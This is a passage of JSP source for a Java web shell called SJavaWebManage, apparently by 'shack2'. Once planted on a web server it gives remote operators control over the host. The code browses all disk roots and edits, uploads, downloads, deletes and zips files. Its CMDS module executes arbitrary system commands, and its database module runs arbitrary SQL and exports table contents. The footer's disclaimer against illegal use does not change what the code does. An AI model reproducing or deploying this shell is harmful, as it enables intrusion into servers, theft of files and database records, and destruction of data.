				String encoding=Util.getRequestStringVal(request, "encode");
				String result="";
				String msg="";
				String content=Util.getRequestStringVal(request, "content");
				if(!Util.isEmpty(content)){
					msg=FileUtil.writeTextToFile(content, path, encoding);
					result=content;
				}
				else{
					result=FileUtil.readFileToString(path,encoding);
				}
				%>
			<div class="editFile">
				<form name="editFileForm"
					enctype="application/x-www-form-urlencoded" method="post" action="">
					<input type="hidden" value="FileManage" name="m" /> <input
						type="hidden" value="editFile" name="do" /> <input type="hidden"
						value="<%=path %>" name="path" />
					<div>
						<select name="encode" onchange="changeEncode(this,'<%=path%>')">
							<option value="UTF-8">&#40664;&#35748;</option>
							<%
					for(int i=0;i<Encodings.length;i++){
						if(!Encodings[i].equals(encoding)){
							out.print("<option>"+Encodings[i]+"</option>");
						}
						else{
							out.print("<option selected=\"selected\">"+Encodings[i]+"</option>");
						}
					}
					%>
						</select><%=msg %>
						<input type="submit" value="&#20445;&#23384;" />
					</div>


					<div id="fileText">
						<textarea name="content" style="height: 400px; width: 100%"><%=result %></textarea>
					</div>
				</form>
			</div>
			<%
			}
			else if("delete".equals(dow)){
				if(!Util.isEmpty(path)){
					File f=new File(path);
					String ppath=Util.formatPath(f.getParent());
					
					//&#21024;&#38500;&#22810;&#20010;
					String files=Util.getRequestStringVal(request, "files");
					if(!Util.isEmpty(files)){
						String[] filesarry=files.split(",");
						for(int i=0;i<filesarry.length;i++){
							FileUtil.deleteFile(filesarry[i]);
						}
						ppath=path;
					}else{
						FileUtil.deleteFile(path);
					}
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+ppath+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
				
			}
			else if("downFile".equals(dow)){
				if(!Util.isEmpty(path)){
					File f=new File(path);
					FileUtil.downLoadFile(response, path);
				}
				
			}
			else if(Util.isEmpty(dow)){
				int dirCount=0;
				int fCount=0;
				String dir=Util.getRequestStringVal(request, "dir");
				if(Util.isEmpty(dir)){
					//&#26174;&#31034;&#26681;&#30446;&#24405;&#25991;&#20214;&#21015;&#34920;
					dir=webRootPath;
				}
				dir=Util.formatPath((dir+"/"));				
				File f=new File(dir);
				%>
			<!--&#25991;&#20214;&#31649;&#29702;-->
			<div id="FileManage">
				<div id="fileListTop">
					<div>
						<form action="<%=shellPath%>" method="post"
							enctype="application/x-www-form-urlencoded" name="turnDir">
							&#24403;&#21069;&#30913;&#30424;&#36335;&#24452;&#65306;<input style="width: 390px; height: 18px" id="currentDir"
								name="dir" type="text" value="<%=dir%>" /><input value="&#36716;&#21040;"
								type="button" onclick="goTargetPath(0)" />
						</form>
						<form
							action="<%=shellPath %>?m=FileManage&do=upload&path=<%=dir%>"
							method="post" enctype="multipart/form-data">
					</div>
					<div>
						&nbsp;&nbsp;&#25991;&#20214;&#19978;&#20256;&#65306;<input name="path" type="hidden" value="<%=dir%>" /><input
							name="m" value="FileManage" type="hidden" /><input name="do"
							value="upload" type="hidden" /><input name="upFile" type="file" /><input
							type="submit" value="&#19978;&#20256;" />&nbsp;&nbsp;<input value="&#36339;&#21040;&#19978;&#32423;&#30446;&#24405;"
							onclick="goTargetPath(1)" type="button" />
						</form>
					</div>
				</div>
				<!--&#30913;&#30424;&#21015;&#34920;-->
				<div id="diskInfo">
					<%	
				File[] rfs=f.listRoots();
				
				if(f.exists()){
					for(int i=0;i<rfs.length;i++){
						File cf=rfs[i];
						
						%>
					<a
						href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})">&#30913;&#30424;(<%=cf.getPath() %>)
					</a>
					<%
				}
				%>
					<a
						href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=webRootPath%>'})">|Web&#26681;&#30446;&#24405;|</a><a
						href="javascript:newFile('1','<%=dir%>')">|&#26032;&#24314;&#25991;&#20214;&#22841;|</a><a
						href="javascript:newFile('0','<%=dir%>')">|&#26032;&#24314;&#25991;&#20214;|</a>
				</div>
				<!--&#25991;&#20214;&#30446;&#24405;&#21015;&#34920;-->
				<div id="filesList">
					<div>
						<dd class="fileName">&#25991;&#20214;&#21517;&#31216;</dd>
						<dd class="fileUpdateTime">&#19978;&#27425;&#20462;&#25913;&#26102;&#38388;</dd>
						<dd class="filePermis">&#21487;&#35835;/&#21487;&#20889;</dd>
						<dd class="fileSize">&#25991;&#20214;&#22823;&#23567;</dd>
						<dd class="fileDo">&nbsp;&nbsp;&nbsp;&#25805;&#20316;</dd>
					</div>
					<%
			//&#26174;&#31034;&#25991;&#20214;&#21015;&#34920;
			
				File[] fs=f.listFiles();
				
				for(int i=0;i<fs.length;i++){
					File cf=fs[i];
					if(cf.isFile()){
						fCount++;
					}
					else{
						dirCount++;
					}
					%>
					<%
					String currentPath=Util.formatPath(dir+cf.getName());
					%>
					<div>
						<dd class="fileName">
							<input type="checkbox" value="<%=currentPath%>" />
							<%if(cf.isDirectory()){out.print("<a href=\"javascript:post('"+shellPath+"',{m:'FileManage',dir:'"+dir+cf.getName()+"'})\">"+cf.getName()+"</a>");}else{out.print(cf.getName());}%>
						</dd>
						<dd class="fileUpdateTime"><%=Util.formatDate(cf.lastModified())%></dd>
						<dd class="filePermis"><%=cf.canRead() %>/<%=cf.canWrite()%></dd>
						<dd class="fileSize"><%=FileUtil.getFileSize(cf.length())%></dd>
						<dd class="fileDo">
							<%if(cf.isFile()){%><a
								href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})">&#32534;&#36753;</a>
							<%}%>
							<%if(cf.isFile()){%><a
								href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})">&#19979;&#36733;</a>
							<%}%>
							<!-- <a href="#">&#22797;&#21046;</a>
					<a href="#">&#23646;&#24615;</a> -->
							<a href="javascript:packFiles('<%=currentPath%>')">&#25171;&#21253;</a> <a
								href="javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})">&#21024;&#38500;</a>
						</dd>
					</div>

					<%
				}
			}
			else{
				Util.print(out, 1, dir+"&#19981;&#23384;&#22312;&#65281;");
			}
			%>
				</div>
				<!--&#25991;&#20214;&#30446;&#24405;&#21015;&#34920;end-->
				<!--&#25991;&#20214;&#20449;&#24687;&#32467;&#26463;-->
				<div id="filesInfo">
					<a href="javascript:checkAll()">&#20840;&#36873;</a><a
						href="javascript:revsAll()">&#21453;&#36873;</a><a
						href="javascript:delSelectFiles('<%=dir %>')">&#21024;&#38500;&#36873;&#20013;&#39033;</a><a
						href="javascript:packSelectFiles('<%=dir%>')">&#25171;&#21253;&#36873;&#20013;&#39033;</a> &#24635;&#35745;<%=dirCount %>&#25991;&#20214;&#22841;&#65292;<%=fCount %>&#20010;&#25991;&#20214;
				</div>
				<!--&#25991;&#20214;&#32467;&#26463;-->
			</div>
			<!--&#25991;&#20214;&#31649;&#29702;&#32467;&#26463;-->

			<%
				
				
			}
		}
		%>
			<%
		if("CMDS".equals(m)){
			String cmd=Util.getRequestStringVal(request, "cmd");
			String encode=Util.getRequestStringVal(request, "encode");
			String result="";
			if(!Util.isEmpty(cmd)&&!Util.isEmpty(encode)){
				result=Util.execCmd(cmd,encode);
			}
			%>

			<!--&#25191;&#34892;&#21629;&#20196;&#24320;&#22987;-->
			<div id="CMDS">
				<form action="<%=shellPath %>" method="post"
					enctype="application/x-www-form-urlencoded">
					&#36755;&#20837;&#21629;&#20196;&#65306;<input name="cmd" value="<%=cmd%>" style="width: 300px"
						type="text" /><input name="m" value="CMDS" type="hidden" /> <select
						name="encode">

						<%
					for(int i=0;i<Encodings.length;i++){
						if(!Encodings[i].equals(encode)){
							out.print("<option>"+Encodings[i]+"</option>");
						}
						else{
							out.print("<option selected=\"selected\">"+Encodings[i]+"</option>");
						}
					}
					%>
					</select> <input value="&#25191;&#34892;" type="submit" />
				</form>
				<div id="execResult"><%=result%></div>
			</div>
			<!--&#25191;&#34892;&#21629;&#20196;&#32467;&#26463;-->
			<%
		}
		%>
			<%
		if("DBManage".equals(m)){
			String dom=Util.getRequestStringVal(request, "do");
			String encode=Util.getRequestStringVal(request, "encode");

			%>
			<!--&#25968;&#25454;&#24211;&#31649;&#29702;&#24320;&#22987;-->
			<div id="DBManage">
				<h4>DataBase Manager &raquo;</h4>
				<%
		if("connect".equals(dom)){
			String driver=Util.getRequestStringVal(request, "driver");
			String url=Util.getRequestStringVal(request, "url");
			String uid=Util.getRequestStringVal(request, "uid");
			String pwd=Util.getRequestStringVal(request, "pwd");
			String db=Util.getRequestStringVal(request, "mydb");
			DBUtil dbo=null;
			try{
				dbo=(DBUtil)session.getAttribute(DBO);
			}catch(Exception e){
				Util.print(out, 2, "&#38656;&#35201;&#37325;&#26032;&#36830;&#25509;&#25104;&#21151;&#65281;");
				if (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid)&&!Util.isEmpty(pwd)) {
					dbo = new DBUtil(driver,url,uid,pwd,true);
					Util.print(out, 1, "&#21019;&#24314;&#26032;&#36830;&#25509;&#25104;&#21151;&#65281;");
				}
				else{
					Util.print(out, 2, "&#36830;&#25509;&#20449;&#24687;&#27809;&#26377;&#22635;&#20889;&#23436;&#25972;&#65281;");
				}
			}
			
			try{
				if (dbo == null || !((DBUtil)dbo).isValid()) {
					if (dbo != null)
					((DBUtil)dbo).close();
					if (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid)&&!Util.isEmpty(pwd)) {
						dbo = new DBUtil(driver,url,uid,pwd,true);
						Util.print(out, 1, "&#21019;&#24314;&#26032;&#36830;&#25509;&#25104;&#21151;&#65281;");
					}
					else{
						Util.print(out, 2, "&#36830;&#25509;&#20449;&#24687;&#27809;&#26377;&#22635;&#20889;&#23436;&#25972;&#65281;");
					}
				}
				else {
					if (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid)&&!Util.isEmpty(pwd)) {
						if(!dbo.notchange(driver, url, uid, pwd)){
							dbo.close();
							dbo = new DBUtil(driver,url,uid,pwd,true);
							Util.print(out, 1, "&#21019;&#24314;&#26032;&#36830;&#25509;&#25104;&#21151;&#65281;");
						}
						else{
							Util.print(out, 1, "&#21462;&#20986;&#19978;&#19968;&#27425;&#30340;&#36830;&#25509;&#65281;");
						}
					}
					else{
						Util.print(out, 1, "&#21462;&#20986;&#19978;&#19968;&#27425;&#30340;&#36830;&#25509;&#65281;");
					}
				} 
				session.setAttribute(DBO,dbo);
			}catch(Exception e){
				Util.print(out, 3, "&#21457;&#29983;&#20102;&#19968;&#28857;&#38169;&#35823;&#65306;"+e.getClass().getName()+": "+e.getMessage());
			}
			
		}
		%>
				<div>

					<table width="100%" border="0" cellspacing="0">
						<tr>
							<td>
								<form name="form_dbinfo" id="form1" action="<%=shellPath %>"
									method="post">
									<div>
										<input name="m" value="DBManage" type="hidden" /> <input
											name="do" value="connect" type="hidden" /> Driver: <input
											name="driver" value="" id="driver" type="text" size="30" />
										URL:<input name="url" value="" id="url" value="" type="text"
											size="75" /> UID:<input name="uid" value="" id="uid"
											value="" type="text" size="5" /> PWD:<input name="pwd"
											value="" id="pwd" value="" type="text" size="8" /> DataBase:
										<select onchange='changeurldriver()' id="mydb" name="mydb">
											<option
												value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>
											<option
												value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>
											<option
												value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql
												Server</option>
											<option
												value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:/ninty.mdb'>Access</option>
											<option value=' ` '>Other</option>
										</select> <input name="connect" id="connect" value="Connect"
											type="submit" size="10" />
									</div>
							</td>
						</tr>
					</table>
				</div>
				<%
			DBUtil dbo=null;
			try{
				dbo=(DBUtil)session.getAttribute(DBO);
			}catch(Exception e){
				session.removeAttribute(DBO);
				Util.print(out, 2, "&#38656;&#35201;&#37325;&#26032;&#36830;&#25509;&#25968;&#25454;&#24211;&#65281;");
			}

			if(dbo!=null&&dbo.isValid()){
				
				%>
				<div id="dbinfo">
					<div>

						<input name="m" value="DBManage" type="hidden" /> &#25968;&#25454;&#24211;&#21015;&#34920;: <select
							onchange="javascript:document.form_dbinfo.submit()"
							id="currentDB" name="currentDB">
							<%
						String currentDB=Util.getRequestStringVal(request, "currentDB");
						
						DatabaseMetaData meta = dbo.getConn().getMetaData();
						ResultSet dbs = meta.getCatalogs();
						try {
							while (dbs.next()){
								String dbname=dbs.getString(1);
								if(!Util.isEmpty(currentDB)&&currentDB.equals(dbname)){
									out.println("<option selected=\"selected\" value=\""+dbname+"\">"+dbname+"</option>");
								}
								else{
									out.println("<option value=\""+dbname+"\">"+dbname+"</option>");
								}
							}
						}catch(Exception ex) {
						}
						dbs.close();
						
					%>

						</select> &#24403;&#21069;&#24211;&#25152;&#26377;&#34920;:<% 
					out.println(meta.getCatalogSeparator());
					%>
						<select id="currentTable" name="currentTable">
							<%
						String currentTable=Util.getRequestStringVal(request, "currentTable");
						ResultSet tables = meta.getTables(currentDB, null, null,null);
						
						try {
							while (tables.next()){
								String tableName=tables.getString("TABLE_NAME");
								
								if(!Util.isEmpty(currentDB)&&currentTable.equals(tableName)){
									out.println("<option selected=\"selected\" value=\""+tableName+"\">"+tableName+"</option>");
								}
								else{
									out.println("<option value=\""+tableName+"\">"+tableName+"</option>");
								}
							}
						}catch(Exception ex) {
						}
						tables.close();
					%>
						</select> <input type="submit" name="loadTableStruct"
							value="loadTableStruct"></input> <input type="submit"
							name="loadTableData" value="loadTableData"></input> <input
							type="submit" name="downTableData" value="downTableData"></input>
						<input type="text" name="exportDataPath" value="c:/sql.txt"></input> <input
							type="submit" name="exportTableData" value="exportTableData"></input>

					</div>
					<div>
						<h4>&#33258;&#23450;&#20041;SQL&#25191;&#34892;&#65306;</h4>
						<div>
							<textarea rows="3" cols="130" name="runmysql"
								<%=Util.getRequestStringVal(request, "runmysql")%>></textarea>
							<input name="runsql" id="runsql" value="runsql"
								style="vertical-align: top; height: 50px" type="submit"
								size="30" />
						</div>
					</div>
					</form>
					<!--&#25968;&#25454;&#26174;&#31034;-->
					<div id="dbdata">
						<table width="100%">
							<%
								if(!Util.isEmpty(currentDB)&&!Util.isEmpty(currentTable)){
											try {
												String loadTableStruct=Util.getRequestStringVal(request, "loadTableStruct");
												String loadTableData=Util.getRequestStringVal(request, "loadTableData");
												String runsql=Util.getRequestStringVal(request, "runsql");
												String runmysql=Util.getRequestStringVal(request, "runmysql");
												if(!Util.isEmpty(loadTableStruct)){
													ResultSet rs = meta.getColumns(currentDB, null,currentTable, null);
													ResultSetMetaData rsmeta = rs.getMetaData();
													int count = rsmeta.getColumnCount();
													out.println("<tr>");
													out.println("<td>COLUMN_NAME</td>");
													out.println("<td>TYPE_NAME</td>");
													out.println("<td>COLUMN_SIZE</td>");
													out.println("</tr>");
													while(rs.next()){
														out.println("<tr>");
														out.println("<td>"+rs.getString("COLUMN_NAME")+"</td>");
														out.println("<td>"+rs.getString("TYPE_NAME")+"</td>");
														out.println("<td>"+rs.getString("COLUMN_SIZE")+"</td>");
														out.println("</tr>");
													}
													rs.close();
												}
												
												if(!Util.isEmpty(loadTableData)){
													runmysql="select * from "+currentTable;		
													runsql="runsql";
												}
																		
												if(!Util.isEmpty(runsql)){
													dbo.conn.setCatalog(currentDB);
													Object obj=dbo.execute(runmysql);
													if (obj instanceof ResultSet) {
														
														ResultSet rs = (ResultSet)obj;
														ResultSetMetaData sqlmeta = rs.getMetaData();
														if(!Util.isEmpty(currentDB)){
															
														}
														int colCount = sqlmeta.getColumnCount();
														out.println("</tr>");
														for (int i=1;i<=colCount;i++) {
															out.println("<td>"+sqlmeta.getColumnName(i)+"("+sqlmeta.getColumnTypeName(i)+")</td>");
														}
														out.println("</tr>");
														
														while(rs.next()) {
															out.println("<tr>");
															for (int i = 1;i<=colCount;i++) {
																out.println("<td>"+rs.getString(i)+"</td>");
															}
															out.println("</tr>");
														}
														rs.close();
													}
													
												}
												String exportTableData=Util.getRequestStringVal(request, "exportTableData");
												String downTableData=Util.getRequestStringVal(request, "downTableData");
												String exportDataPath=Util.getRequestStringVal(request, "exportDataPath");
												if (!Util.isEmpty(exportTableData)|| !Util.isEmpty(downTableData)) {
													dbo.conn.setCatalog(currentDB);
													if (Util.isEmpty(runmysql)) {
														runmysql = "select * from " + currentTable;
													}

													Object o = dbo.execute(runmysql);
													byte[] rowSep = "\r\n".getBytes();
													if (o instanceof ResultSet) {
														ResultSet rs = (ResultSet) o;
														ResultSetMetaData dmeta = rs.getMetaData();
														int count = dmeta.getColumnCount();
														
														BufferedOutputStream output = null;
														DataOutputStream dout=null;
														FileOutputStream fs=null;
														if (!Util.isEmpty(exportDataPath)&& !Util.isEmpty(exportTableData)) {
															//exportfile
															fs=new FileOutputStream(new File(exportDataPath));
															output = new BufferedOutputStream(fs);
															dout=new DataOutputStream(output);
															
														} else {
															out.clear();
															out=pageContext.pushBody();
															//download.
															response.setHeader(
																	"Content-Disposition",
																	"attachment;filename=DataExport.txt");
															output = new BufferedOutputStream(
																	response.getOutputStream());
															dout=new DataOutputStream(output);
														}
														
														for (int i = 1; i <= count; i++) {
															String colName = dmeta.getColumnName(i)+ "\t";
															byte[] b = null;
															if (Util.isEmpty(encode)) {
																b = colName.getBytes();
															} else {
																b = colName.getBytes(encode);
															}
															dout.write(b, 0, b.length);
														}
														
														dout.write(rowSep, 0, rowSep.length);
														while (rs.next()) {
															for (int i = 1; i <= count; i++) {
																String v = null;
																try {
																	v = rs.getString(i);
																	
																} catch (Exception ex) {
																	v = "<Error>";
																}
																v += "\t";
																
																byte[] b = null;
																if (Util.isEmpty(encode)) {
																	b = v.getBytes();
																	
																} else {
																	b = v.getBytes(encode);
																}
																dout.write(b, 0, b.length);
															}
															dout.write(rowSep, 0, rowSep.length);
														}
														rs.close();
														if(dout!=null){
															dout.close();
														}
														if(output!=null){
															output.close();
														}
														if(fs!=null){
															fs.close();
														}
													}
												}

											} catch (Exception e) {
												Util.print(out, 3, e.getMessage());
											}

										}
							%>
						</table>
					</div>
					<!--&#25968;&#25454;&#26174;&#31034;-->
				</div>
				<%
			}
			%>

			</div>
			<!--&#25968;&#25454;&#24211;&#31649;&#29702;&#32467;&#26463;-->
			<%
		}
		%>
		</div>
		<!--&#20869;&#23481;&#32467;&#26463;-->
		<div class="bottom">
			Copyright (c) 2014-2016 <a href="http://www.shack2.org">http://www.shack2.org</a>
			All Rights Reserved| coded by shack2 | Powered By SJavaWebManage|
			&#24403;&#21069;&#29256;&#26412;:<%=VERSION%>&nbsp;&#35831;&#21247;&#20351;&#29992;&#26412;&#24037;&#20855;&#38750;&#27861;&#20837;&#20405;&#31649;&#29702;&#20219;&#20309;&#31995;&#32479;&#65292;&#35831;&#21512;&#27861;&#20351;&#29992;&#65292;&#20854;&#36896;&#25104;&#30340;&#19968;&#20999;&#21518;&#26524;&#19982;&#20316;&#32773;&#26080;&#20851;&#12290;</div>
	</div>
	<script type="text/javascript">
var menue=document.getElementById("menue");

var menues=menue.getElementsByTagName("a");

for(var i=0;i<menues.length;i++)
{
	//menues[i].style.backgroundColor="#"+Math.floor(Math.random()*499999+500000);
	menues[i].style.backgroundColor="#333";
	menues[i].onmouseover=function(){
		this.style.backgroundColor="#fefefe";
		this.style.color="#111";
	};
	menues[i].onmouseout=function(){
		this.style.backgroundColor="#333";
		this.style.color="#fff";
	}; 
}
//filesManage&#40736;&#26631;in out
var fdiv=document.getElementById("filesList");
if(fdiv!="undefined"&&fdiv!=null){
	var fsdiv=fdiv.getElementsByTagName("div");

	for(var i=0;i<fsdiv.length;i++){
		fsdiv[i].onmouseover=function(){
			this.style.backgroundColor="#F5F2E8";
		};
		fsdiv[i].onmouseout=function(){
			this.style.backgroundColor="#fcfcfc";
		}; 
	}
}
//db&#40736;&#26631;in out
var datatable=document.getElementById("dbdata");

if(datatable!="undefined"&&datatable!=null){
	var datatd=datatable.getElementsByTagName("tr");
	
	for(var i=0;i<datatd.length;i++){
		datatd[i].onmouseover=function(){
			this.style.backgroundColor="#f5f5f5";
		};
		datatd[i].onmouseout=function(){
			this.style.backgroundColor="#fff";
		}; 
	}
}


var ms=document.getElementById("menue").getElementsByTagName("a");
var mdivs=document.getElementById("content").getElementsByTagName("div");

for(var i=0;i<ms.length;i++){
	if(ms[i].name!=""){
		ms[i].onclick=function(){
			for(var j=0;j<ms.length;j++){		
				if(ms[j].name!=""){
					document.getElementById(ms[j].name).style.display="none";
				}
			}
			document.getElementById(this.name).style.display="block";
		};
	}
}
function goTargetPath(type){
	var dir=document.getElementById("currentDir").value;
	dir=dir.replace("//","/");
	if(type==1){
		var l=dir.lastIndexOf("/");
		dir=dir.substr(0,l);
		l=dir.lastIndexOf("/");
		dir=dir.substr(0,l);
	}
	post('<%=shellPath%>',{'m':'FileManage','dir':dir});
}
function changeEncode(code,path){
	var encode=code.value;
	post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':path,'encode':encode});
}
function newFile(isDir,currentDir){
	var name = prompt('&#35831;&#36755;&#20837;&#30446;&#24405;&#21517;&#25110;&#25991;&#20214;&#21517;&#65281;','');
	if (name == null || name.trim().length == 0){
		alert("&#36755;&#20837;&#38169;&#35823;&#65281;");
		return;
	}
	post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});
}
function packFiles(path){
	var zipName = prompt('&#35831;&#36755;&#20837;&#21387;&#32553;&#25991;&#20214;&#21517;&#65281;','');
	if (zipName == null || zipName.trim().length == 0){
		alert("&#36755;&#20837;&#38169;&#35823;&#65281;");
		return;
	}
	post('<%=shellPath%>', {
				'm' : 'FileManage',
				'do' : 'packFiles',
				'path' : path,
				'zipName' : zipName
			});
		}

		function getSelect() {
			var inputs = document.getElementById("filesList")
					.getElementsByTagName("input");
			var s = "";
			for (var i = 0; i < inputs.length; i++) {
				if (inputs[i].checked) {
					s = s + inputs[i].value + ",";
				}
			}
			if (s.length > 1) {
				return s.substr(0, s.length - 1);
			}
			return "";
		}
		//&#20840;&#36873;
		function checkAll() {
			var inputs = document.getElementById("filesList")
					.getElementsByTagName("input");
			for (var i = 0; i < inputs.length; i++) {
				inputs[i].checked = true;
			}
		}
		//&#21024;&#38500;&#36873;&#20013;
		function delSelectFiles(path) {

			var delfs = getSelect();
			if (delfs == "") {
				alert("&#27809;&#26377;&#36873;&#25321;&#25991;&#20214;&#65281;");
				return;
			}
			post('<%=shellPath%>',{'m':'FileManage','do':'delete','path':path,'files':delfs});
}
 
function packSelectFiles(path)
{
  var pfs=getSelect();
  if(pfs==""){
	  alert("&#27809;&#26377;&#36873;&#25321;&#25991;&#20214;&#65281;");
	  return;
  }
  var zipName = prompt('&#35831;&#36755;&#20837;&#21387;&#32553;&#25991;&#20214;&#21517;&#65281;','');
  if (zipName == null || zipName.trim().length == 0){
	  alert("&#36755;&#20837;&#38169;&#35823;&#65281;");
	  return;
	}
	post('<%=shellPath%>',{'m':'FileManage','do':'packFiles','path':path,'files':pfs,'zipName':zipName});
}
 
//&#21453;&#36873;
function revsAll()
 {
   var inputs=document.getElementById("filesList").getElementsByTagName("input");
   for(var i=0;i<inputs.length;i++){
	   if(inputs[i].checked){
		   inputs[i].checked=false;  
	   }
	   else{
		   inputs[i].checked=true;
	   }
    	
   }
}
function changeurldriver(){
	var mydb=document.getElementById("mydb").value;
	var strs=mydb.split("`");
	var driver=document.getElementById("driver");
	driver.value=strs[0];
	var url=document.getElementById("url");
	url.value=strs[1];
}
</script>
</body>
</html>
